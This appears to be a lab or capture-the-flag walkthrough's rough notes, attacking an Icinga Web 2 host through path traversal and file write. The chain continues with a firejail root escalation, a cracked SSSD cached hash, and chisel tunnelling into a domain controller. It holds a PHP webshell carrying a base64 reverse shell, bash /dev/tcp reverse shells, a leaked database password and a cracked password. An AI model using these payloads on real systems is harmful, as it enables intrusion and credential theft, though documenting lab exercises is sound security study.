@@ -1,0 +1,380 @@
+
+
+
+on port 8080
+Icinga Web 2
+
+there exists some vulns
+https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/
+
+
+http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts
+
+127.0.0.1 iceinga.cerberus.local iceinga
+127.0.1.1 localhost
+172.16.22.1 DC.cerberus.local DC cerberus.local
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+
+https://icinga.com/docs/icinga-web/latest/doc/03-Configuration/
+"Apart from its web configuration capabilities, the local configuration is stored in /etc/icingaweb2 by default (depending on your configuration setup)."
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini
+[icingaweb2]
+type = "db"
+db = "mysql"
+host = "localhost"
+dbname = "icingaweb2"
+username = "matthew"
+password = "IcingaWebPassword2023"
+use_ssl = "0"
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+"According to the disclosure, there is a lack of sanitization on the user field when creating an SSH Resource
+module. By prepending a path with ../ inside the User field, we're able to write outside of the intended
+directory which we can also verify with the LFI . So let's test this real quick by accessing the following
+endpoint"
+
+"Site navigation is: Configuration / Application / Resource / Create a New Resource and select SSH
+Identity as the Resource Type .
+Icinga expects a valid private key in order to create a resource, however, the error message produced is
+The given SSH key is invalid when invalid data is passed.
+Typically, it would be assumed that using ssh-keygen to get a key would work, but in this case, Icinga
+expects an RSA private key generated with OpenSSL . So let's create a key and submit it to Icinga and
+then use the LFI to verify it."
+
+
+"We can see that we are indeed successful in getting arbitrary file writes on the target. At this point we can
+follow the rest of the SonarSource article to take advantage of the NULL byte bug, however, this will fail
+as the OpenSSL library on the target seems to have been patched. So let's look a bit more into what the
+NULL byte bug actually is.
+
+A Google search of OpenSSL null byte bug leads us to this bug tracker, which states the following:
+So let's test this by prepending a PHP payload before the start of the RSA key and submitting it to the same
+endpoint as before, saving the file at /dev/shm/test.txt .
+
+Reading the written file using the LFI confirms that it worked successfully. The next step is figuring out
+how we can leverage this to get code execution on the target. Since we are an administrator on Icinga we
+can build a custom Icinga module and write it to the filesystem using our path traversal and then change
+the module path to point to the directory we write to. So let's figure out how to make an Icinga module.
+The configuration.php file is one file that is part of a given module and should immediately stand out.
+Looking further down in this tutorial it mentions that configuration.php is where the global configuration
+of the module is located, which means this code should get loaded first.
+We can reuse our test directory again and set the module path to the directory with our prepending LFI
+/dev/shm .
+
+It looks like this is assuming a valid cert can not be a valid PHP file, but I am not
+sure why exactly not? The standard
+[https://datatracker.ietf.org/doc/html/rfc7468#section-5.2]
+(https://datatracker.ietf.org/doc/html/rfc7468#section-5.2) allows arbitrary text
+before BEGIN and after END lines, and you can easily insert PHP code there. Assuming
+that if the text is a valid certificate for OpenSSL then it's safe for all other
+purposes is just not secure."
+
+
+
+"Reading the written file using the LFI confirms that it worked successfully. The next step is figuring out
+how we can leverage this to get code execution on the target. Since we are an administrator on Icinga we
+can build a custom Icinga module and write it to the filesystem using our path traversal and then change
+the module path to point to the directory we write to. So let's figure out how to make an Icinga module.
+The configuration.php file is one file that is part of a given module and should immediately stand out.
+Looking further down in this tutorial it mentions that configuration.php is where the global configuration
+of the module is located, which means this code should get loaded first.
+We can reuse our test directory again and set the module path to the directory with our prepending LFI
+/dev/shm "
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# openssl genrsa -out private-key.pem 1024                 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# echo 'bash -c "bash -i >& /dev/tcp/10.10.14.38/53 0>&1"' | base64 -w 0         
+YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zOC81MyAwPiYxIgo=                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# nano private-key.pem                 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat private-key.pem                                                                                            
+<?php
+{
+	system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zOC81MyAwPiYxIgo=|base64 -d|bash");
+}
+?>
+
+-----BEGIN PRIVATE KEY-----
+MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAMoTJrVfmsZn5MZh
+MEPxCHjo9oVY6qb7voMupiHH5eGqPVUlkx9C9SC4DtcgUe+0pJ6QUdYKilC/p5yt
+E57rh9cojpXDXM2QsTR3LXqAgYknDCSSZfEou0NeK6FvtHNkGL++u057E4SZyyMp
+tSKl8cqBZi+IRKeVY/LbMK7y6AfRAgMBAAECgYAnOgR/nOl8rlpYsDEgXz/XyNFi
+HVqfw6q96GZTlGxpnBR/3OVsYiEXkuM+m4WMVLLIHRflxvIGrs2oumhepzYdE9hu
+K0kzldYYib/aPJtEF1uMBNxHJ8x3+tvGZskMQ/+bfM1/sYI9qhhVgiYymEBsdoR4
+frSVvUKcYNNT7ycgAQJBAO6j2AE1RpBZkpE6Q6eXx/+oVxN8CyUtiWvgHTPARo6a
+it1PgPMbDKI9LQ42KvWgDv9vL/noAufhouf7cl2dbQECQQDYxlv32q6AVB+go8+H
+TkXpDqgE7KKFZHBuk8WKe71+myc6qksyXsnmShNbIS5ffH+vLoQuRlalNiKlLae/
+IArRAkEA169sToM5WMQsbWgst6++Srp6oRiu9hY3KzHvEtQIsWDKe4Yc9RyQiZ4j
+N8ILh973TzTONt/UqIHN/D/OOQBNAQJAZJ9mz102BSGHcNS5H1CJCQ6hlW+WXR7r
+RZjYaFjZ9CvnAMdNknsHcxtNcs6rLO2og1OvTZ+e1p+TY2MW65PfEQJBAOynPYBA
+nupp24mS0mcNQsBPM1CgjKd3GmHS4T6hPQFpulUWNqxdlvRrsyG/QrHq+zr9jWAW
+TjEScBs5pdGQXi8=
+-----END PRIVATE KEY-----
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+"We make sure to set the User field to point to ../../../../../dev/shm/training/configuration.php ,
+where training is the name of our custom module."
+
+"Next we'll need to enable our module so that it executes automatically, but we need to change the
+configuration of Icinga first. Navigate to: Configuration / Application / General and change the
+Module Path to /dev/shm and click Save Changes"
+
+"Next we'll need to enable our module so that it executes automatically, but we need to change the
+configuration of Icinga first. Navigate to: Configuration / Application / General and change the
+Module Path to /dev/shm and click Save Changes .
+
+Next we'll need to enable the module that was created. In this case it was training , which we can find
+under Configuration / Modules ."
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 53                          
+listening on [any] 53 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.10.11.205] 49874
+bash: cannot set terminal process group (623): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@icinga:/usr/share/icingaweb2/public$ 
+
+
+www-data@icinga:/usr/share/icingaweb2/public$ find / -perm -u=s -type f 2>/dev/null
+/usr/sbin/ccreds_chkpwd
+/usr/bin/mount
+/usr/bin/sudo
+/usr/bin/firejail
+/usr/bin/chfn
+/usr/bin/fusermount3
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/ksu
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/umount
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+www-data@icinga:/usr/share/icingaweb2/public$ 
+
+
+www-data@icinga:/usr/share/icingaweb2/public$ firejail --version
+firejail version 0.9.68rc1
+
+
+https://www.openwall.com/lists/oss-security/2022/06/08/10/1
+
+requires 2 shells. so we send another in background process
+
+www-data@icinga:/usr/share/icingaweb2/public$ bash -c 'bash -i >& /dev/tcp/10.10.14.38/4444 0>&1 &'
+www-data@icinga:/usr/share/icingaweb2/public$ 
+
+
+
+
+www-data@icinga:/var/tmp$ chmod +x firejoin.py
+www-data@icinga:/var/tmp$ ./firejoin.py
+You can now run 'firejail --join=1493' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# stty raw -echo ; fg ; reset    
+[1]  + continued  nc -lnvp 4444
+                               stty columns 117 rows 24
+www-data@icinga:/usr/share/icingaweb2/public$ cd /var/tmp
+www-data@icinga:/var/tmp$ firejail --join=1493
+changing root to /proc/1493/root
+Warning: cleaning all supplementary groups
+Child process initialized in 34.60 ms
+www-data@icinga:/var/tmp$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@icinga:/var/tmp$ su -
+root@icinga:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@icinga:~# 
+
+
+"If we look at techniques for Active Directory joined Linux instances we'll find some good information, but its
+not particularly useful as the required .secrets.mkey file does not exist. What is useful is the directory
+that it points out, namely /var/lib/sss."
+
+
+root@icinga:~# ps aux |grep root
+...
+root         566  0.0  1.8  30116 16276 ?        Ss   07:09   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+root         570  0.0  1.4  93916 13160 ?        Ss   07:09   0:00 /usr/sbin/sssd -i --logger=files
+root         623  0.0  1.9 282620 17656 ?        Ss   07:09   0:00 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
+root         723  0.0  0.4   7136  4080 ?        Ss   07:09   0:00 /usr/sbin/apache2 -k start
+root         784  0.0  1.8  98216 16828 ?        S    07:09   0:00 /usr/libexec/sssd/sssd_be --domain cerberus.local --uid 0 --gid 0 --logger=files
+root         843  0.0  2.7 109520 24804 ?        S    07:09   0:00 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
+root         849  0.0  1.6  83340 14868 ?        S    07:09   0:00 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
+
+"Within this directory, it can be noted that /var/lib/sss/db contains some cache files. Looking up what
+these could be indicates that it is a database for the domain cache and has information about user
+credentials"
+
+
+root@icinga:~# strings /var/lib/sss/db/cache_cerberus.local.ldb |sort -u |head
+$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0
+&DN=@ATTRIBUTES
+&DN=@BASEINFO
+&DN=@INDEX:CN:CERBERUS.LOCAL
+&DN=@INDEX:CN:CERTMAP
+&DN=@INDEX:CN:GROUPS
+&DN=@INDEX:CN:RANGES
+&DN=@INDEX:CN:SUDORULES
+&DN=@INDEX:CN:SYSDB
+&DN=@INDEX:CN:USERS
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo '$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0'>hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash                 
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+147258369        (?)     
+1g 0:00:00:00 DONE (2025-12-09 02:48) 14.28g/s 7314p/s 7314c/s 7314C/s 123456..letmein
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.205 - - [09/Dec/2025 02:53:35] "GET /chisel HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# ./chisel server -p 6666 -reverse
+2025/12/09 02:54:37 server: Reverse tunnelling enabled
+2025/12/09 02:54:37 server: Fingerprint mn8MzXhUoSiyFt4O7Xcp/tZSZqenCdxY2CddytSfVeQ=
+2025/12/09 02:54:37 server: Listening on http://0.0.0.0:6666
+2025/12/09 02:54:45 server: session#1: tun: proxy#R:5001=>172.16.22.1:5985: Listening
+
+
+
+root@icinga:~# wget http://10.10.14.38/chisel
+--2025-12-09 07:53:53--  http://10.10.14.38/chisel
+Connecting to 10.10.14.38:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 10240184 (9.8M) [application/octet-stream]
+Saving to: 'chisel'
+
+chisel                        100%[==============================================>]   9.77M  12.2MB/s    in 0.8s    
+
+2025-12-09 07:53:54 (12.2 MB/s) - 'chisel' saved [10240184/10240184]
+
+root@icinga:~# ls -lsa
+total 10032
+    4 drwx------  5 root root     4096 Dec  9 07:53 .
+    4 drwxr-xr-x 18 root root     4096 Jan 23  2023 ..
+    0 lrwxrwxrwx  1 root root        9 Jan 22  2023 .bash_history -> /dev/null
+    4 -rw-r--r--  1 root root     3106 Oct 15  2021 .bashrc
+    4 drwx------  3 root root     4096 Mar  1  2023 .cache
+    4 drwxr-xr-x  3 root root     4096 Jan 29  2023 .local
+    4 -rw-r--r--  1 root root      161 Jul  9  2019 .profile
+10004 -rw-r--r--  1 root root 10240184 Dec  8 15:01 chisel
+    4 drwxr-xr-x  2 root root     4096 Jan 29  2023 cleanup
+root@icinga:~# chmod +x chisel
+root@icinga:~# 
+root@icinga:~# ./chisel client 10.10.14.38:6666 R:5001:172.16.22.1:5985
+2025/12/09 07:55:02 client: Connecting to ws://10.10.14.38:6666
+2025/12/09 07:55:03 client: Connected (Latency 36.2817ms)
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i 127.0.0.1 -p 147258369 -u matthew -P 5001
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\matthew\Documents> 
+
+
+
+
+
+
+*Evil-WinRM* PS C:\Users\matthew\Documents> upload chisel.exe
+                                        
+Info: Uploading /home/kali/chisel.exe to C:\Users\matthew\Documents\chisel.exe
+                                        
+Data: 14149632 bytes of 14149632 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\matthew\Documents> .\chisel.exe client 10.10.14.38:8001 R:9251:127.0.0.1:9251
+chisel.exe : 2025/12/09 00:10:06 client: Connecting to ws://10.10.14.38:8001
+    + CategoryInfo          : NotSpecified: (2025/12/09 00:1...0.10.14.38:8001:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+2025/12/09 00:10:06 client: Connected (Latency 35.0746ms)
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ./chisel server -p 8001 -reverse -v
+2025/12/09 03:09:22 server: Reverse tunnelling enabled
+2025/12/09 03:09:22 server: Fingerprint +5kZ5K3xXhdJGdWJKFHMoNSRN1K2+meETTcDy7OQ2LU=
+2025/12/09 03:09:22 server: Listening on http://0.0.0.0:8001
+2025/12/09 03:09:48 server: session#1: Handshaking with 10.10.11.205:56779...
+2025/12/09 03:09:48 server: session#1: Verifying configuration
+2025/12/09 03:09:48 server: session#1: tun: Created
+2025/12/09 03:09:48 server: session#1: tun: proxy#R:9251=>9251: Listening
+2025/12/09 03:09:48 server: session#1: tun: SSH connected
+2025/12/09 03:09:48 server: session#1: tun: Bound proxies
+
+
+upon visiting 127.0.0.1:8001
+https://dc.cerberus.local/adfs/ls/?SAMLRequest=pVPLbtswELz3KwTerQcjyRJhOXDtBjXgtIKt9NBLQZErh4BEuiTlJH8fyo%2FULVoXaE8EyNnd2Znh5Pa5a709aCOULFDkh8gDyRQXclugh%2BpulKHb6buJoV2Ld2TW20e5hu89GOvNjAFtXd1cSdN3oDeg94LBw3pVoEdrd4YEwWJOcpxEwdBgpbZCBumYZjwKozQP4xBzltJ0HMd11rCMjhmNKGuyrMYN8hZuipDUHqidG3LmM9A16N74rWK0DShvTNCaAHnLRYG%2BZYwncc4SHHOgcZynKSR1yPObjGHMaupgxvSwlMZSaQuEQ5yMIjwK8yrMSBSRJPGT7OYr8kqtrGKqfS%2FkUY9eS6KoEYZI2oEhlpHN7H5FsB%2BS%2Bggy5GNVlaPy86Y6NNgLDvqTQxfonkq6hQ%2FSiQDebLGBtjkp5pVtb5D35WwDHmxwxkhDjsJfH7078UTTo0%2FksKD27pTuqL1eO9wIPmoOUALSCvvy0%2Bzr5fScATT9f8cnwSX96Tl0g3rLRalawV68Wduqp7kGap2iVveA%2Frpm5Ee%2FrNlLswMmGgEcBW9zTrkGfki5C7WFZ%2BvNVbejWpjBF3imzL6pfAmbt06JNTT%2FpNxVGCNs6O2uS3c8Kc2HWAJzPCtN3SJK27Nwv2M0PT3%2BYb8fz5d%2Fe%2FoK&RelayState=aHR0cHM6Ly9EQzo5MjUxL3NhbWxMb2dpbi9MT0dJTl9BVVRI
+
+"We can take note it is doing a lot of redirects and ends with the below URL that indicates some type of
+Security Assertion Markup Language ( SAML ) authentication is taking place with ADFS"
+
+
+https://www.samltool.com/decode.php
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<saml2p:AuthnRequest AssertionConsumerServiceURL="https://DC:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f" Destination="https://dc.cerberus.local/adfs/ls/" ID="_8cd549c524dea44966e5b0d938c22cba" IssueInstant="2025-12-09T08:11:55.583Z" 
+
+
+
+
+
